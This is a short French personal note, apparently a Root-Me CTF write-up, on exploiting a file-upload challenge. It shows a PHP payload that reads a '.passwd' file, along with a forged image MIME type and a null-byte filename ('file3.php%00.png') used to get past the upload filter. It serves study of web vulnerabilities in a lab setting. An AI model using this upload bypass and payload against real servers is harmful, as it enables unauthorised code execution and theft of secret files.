<script src="../../../js/password-protect.js"></script>

---
categorie: web-server
tags:
  - rootme
  - "#informatique/cyber"
---
# But

rÃ©cupÃ©rer un flag surmenet dans \<racine\>/.passwd en uploadant un fichier de type .jpg ou png ou autre - type photo - avec du php cachÃ© dedans

# Fourni

un site avec un bouton pour upload un fichier


# MÃ©thode de rÃ©solution

voir en premier la mÃ©thode de rÃ©solution pour le [[File upload - Type MIME]]

on va donc enovyer un fichier qui nous permettra d'afficher notre fichier comme si c'Ã©tait une image

voici le contenu de notre fichier : 


```
<?php
$homepage = file_get_contents('../../../.passwd');
echo $homepage;
?>
```

je l'ai simplement appellÃ© "file.php"

et lorsque je l'envoie sur le site :

![[Pasted image 20241015223514.png]]

je vais donc essayer d'utiliser le type mime pour faire croire au serveur que j'envoie une image (avec burp suite)

![[Pasted image 20241015223742.png]]


on utilise donc le type MIME et on utilise le null byte %00 pour ne pas ajouter le reste de la requete donc le nom du fichier sera bien file3.php et pas le reste.

voir : [lien](https://www.thehacker.recipes/web/inputs/null-byte-injection)


filename="file3.php%00.png"
Content-Type: image/png


![[Pasted image 20241015224035.png]]



# Conclusion


challenge chouette rÃ©alisÃ© rapidement